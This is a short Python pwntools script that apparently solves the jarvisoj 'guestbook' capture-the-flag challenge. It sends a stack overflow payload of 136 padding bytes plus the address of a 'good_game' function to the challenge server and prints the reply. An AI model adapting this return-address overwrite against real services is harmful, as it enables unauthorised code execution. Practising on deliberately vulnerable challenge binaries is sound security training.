from pwn import *


def guestbook(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/guestbook'):
    print('guestbook start')
    target = remote('pwn.jarvisoj.com', 9876)
    target_elf = ELF(file_name)

    good_game_ptr = p64(target_elf.symbols['good_game'])

    payload = b'A' * 136
    # good_game()
    payload += good_game_ptr

    target.sendline(payload)

    print(target.recvuntil('I have received your message, Thank you!\n').decode('utf-8'))
    print(target.recvline().decode('utf-8'))

    print('guestbook end')


if __name__ == '__main__':
    guestbook()